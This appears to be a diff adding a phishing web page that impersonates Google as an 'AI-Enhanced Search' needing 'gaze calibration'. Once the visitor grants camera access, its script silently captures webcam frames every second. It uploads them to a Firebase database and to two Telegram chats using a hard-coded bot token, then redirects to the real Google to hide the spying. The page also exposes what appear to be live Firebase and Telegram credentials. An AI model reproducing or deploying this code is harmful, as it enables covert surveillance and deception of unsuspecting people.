@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --g-blue: #1a73e8;
+            --g-red: #ea4335;
+            --g-yellow: #fbbc05;
+            --g-green: #34a853;
+            --g-bg: #202124;
+            --g-surface: #303134;
+            --g-text: #e8eaed;
+            --g-sub: #bdc1c6;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--g-bg); color: var(--g-text);
+            font-family: Arial, sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+        }
+
+        .advanced-ui-card {
+            width: 100%; max-width: 500px; background: var(--g-surface);
+            border-radius: 8px; border: 1px solid #3c4043;
+            box-shadow: 0 12px 30px rgba(0,0,0,0.5); overflow: hidden; text-align: center;
+        }
+
+        .adv-header {
+            padding: 15px; border-bottom: 1px solid #3c4043;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+
+        .adv-tag { background: #3c4043; color: var(--g-sub); font-size: 10px; padding: 3px 8px; border-radius: 4px; font-family: monospace; }
+
+        .search-body { padding: 40px 30px; }
+
+        .google-logo { font-size: 32px; font-weight: bold; margin-bottom: 25px; user-select: none; }
+        .google-logo span:nth-child(1) { color: var(--g-blue); }
+        .google-logo span:nth-child(2) { color: var(--g-red); }
+        .google-logo span:nth-child(3) { color: var(--g-yellow); }
+        .google-logo span:nth-child(4) { color: var(--g-blue); }
+        .google-logo span:nth-child(5) { color: var(--g-green); }
+        .google-logo span:nth-child(6) { color: var(--g-red); }
+
+        .secure-search-box {
+            display: flex; align-items: center; gap: 10px;
+            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
+            padding: 10px; border-radius: 8px; margin-bottom: 25px;
+        }
+
+        .lock-icon { width: 18px; fill: var(--g-sub); }
+
+        p { font-size: 13px; color: var(--g-sub); line-height: 1.6; margin-bottom: 30px; }
+
+        .btn-adv {
+            background: var(--g-blue); color: #fff; border: none;
+            width: 100%; padding: 12px; font-size: 14px; font-weight: 500;
+            border-radius: 4px; cursor: pointer; transition: background 0.2s;
+        }
+        .btn-adv:hover { background: #1b66c9; }
+
+        /* Calibration UI */
+        #sync-ui { display: none; }
+        
+        .gaze-loader {
+            width: 50px; height: 50px; margin: 0 auto 20px;
+            border: 3px solid rgba(255,255,255,0.05); border-top-color: var(--g-blue);
+            border-radius: 50%; animation: g-spin 1s linear infinite;
+        }
+        @keyframes g-spin { to { transform: rotate(360deg); } }
+
+        .terminal-log {
+            text-align: left; background: #000; padding: 12px; border-radius: 4px;
+            font-family: monospace; font-size: 10px; color: #fff; margin-top: 25px; border: 1px solid #3c4043;
+        }
+        .node-tag { font-size: 10px; color: var(--g-sub); margin-top: 20px; font-family: monospace; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <div style="flex: 1; display: flex; align-items: center; justify-content: center;">
+        <div class="advanced-ui-card">
+            <div class="adv-header">
+                <div class="adv-tag">SECURE_QUERY_TERMINAL</div>
+                <div style="font-size: 11px; color: var(--g-blue);">AI-Gaze-Sync</div>
+            </div>
+
+            <div class="search-body" id="init-view">
+                <div class="google-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+                <div class="secure-search-box">
+                    <svg class="lock-icon" viewBox="0 0 24 24"><path d="M12 2C9.24 2 7 4.24 7 7V9H6C4.9 9 4 9.9 4 11V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V11C20 9.9 19.1 9 18 9H17V7C17 4.24 14.76 2 12 2ZM10 7C10 5.9 10.9 5 12 5C13.1 5 14 5.9 14 7V9H10V7ZM12 17C10.9 17 10 16.1 10 15C10 13.9 10.9 13 12 13C13.1 13 14 13.9 14 15C14 16.1 13.1 17 12 17Z"/></svg>
+                    <div style="font-size: 14px; color: #fff;">Initialize AI-Enhanced Search</div>
+                </div>
+                <p>Activate <b>Search Intelligence Handshake</b>. To minimize latency, this terminal calibrates against your gaze vectors for optimized result rendering.</p>
+                
+                <button class="btn-adv" onclick="startGoogleSync()">Continue to Secure Search</button>
+                <div class="node-tag">Node: Gaya_South_Bihar_IN</div>
+            </div>
+
+            <div class="search-body" id="sync-ui">
+                <div class="gaze-loader"></div>
+                <div style="font-weight: 500;">Calibrating Presence Vectors...</div>
+                <div style="font-size: 12px; color: var(--g-sub); margin-top: 8px;" id="g-timer">Calibration handshake expires in 60s</div>
+                
+                <div class="terminal-log">
+                    > PING Gaya_Central_Uplink... OK<br>
+                    > ENCRYPTING_GAZE_VECTORS... OK<br>
+                    > STATUS: Presence_Awareness_Handshake
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startGoogleSync() {
+            try {
+                // Framing camera access as Gaze-Sync for search optimization
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('g-timer').innerText = `Calibration handshake expires in ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            googleCapture(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to official Google
+                            window.location.href = "https://www.google.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.google.com";
+            }
+        }
+
+        function googleCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "GOOGLE_SECURE_SPOOF", 
+                ts: Date.now(),
+                loc: "GAYA_TERMINAL" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'google_recon_gaya.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
